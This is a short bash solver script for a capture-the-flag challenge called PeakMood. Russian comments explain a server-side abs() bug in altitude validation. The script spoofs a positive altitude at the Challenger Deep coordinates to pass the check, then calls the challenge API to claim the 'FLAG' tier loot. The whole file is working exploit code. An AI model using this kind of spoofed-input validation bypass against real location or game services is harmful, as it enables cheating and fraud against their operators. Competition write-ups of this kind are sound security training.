#!/bin/bash
# PeakMood — abs() bug в проверке высоты на сервере.
#
# Сервер сравнивает |reported_alt| с |expected_elevation|, а tier выдаёт по reported_alt напрямую.
# В terrain_anchors.csv нет ни одной точки с elevation >= 9500м (max — Эверест 8849).
# Зато есть океанские желоба с elevation -10047..-10935м.
# Если послать в Tonga Trench / Challenger Deep положительную высоту 10800/10935,
# то |10935| - |-10935| = 0 (delta пройдёт), а 10935 >= 9500 → tier="FLAG".
#
# Подсказка в условии: "когда ты парня нашла" — пара симметричных значений (+/-).
set -euo pipefail
BASE=https://peakmood-ou1mhzjv.alfactf.ru

TOK=$(curl -sS -X POST "$BASE/api/v1/session/open" \
  -H "Content-Type: application/json" \
  -d '{"device_id":"solver","client_version":"1.0.0","model":"X"}' | jq -r .session_token)

# Challenger Deep: 11.3733, 142.5917, expected = -10935m
NODE=$(curl -sS -X POST "$BASE/api/v1/geo/update" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOK" \
  -d '{"lat":11.3733,"lon":142.5917,"reported_alt_m":10935,"vertical_accuracy_m":3.0}' \
  | jq -r .scan.node.id)

for _ in 1 2 3 4 5; do
  curl -sS -X POST "$BASE/api/v1/node/hit" \
    -H "Content-Type: application/json" -H "Authorization: Bearer $TOK" \
    -d "{\"node_id\":\"$NODE\"}" > /dev/null
done

curl -sS -X POST "$BASE/api/v1/node/open" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOK" \
  -d "{\"node_id\":\"$NODE\"}" | jq -r .loot.artifact_signature
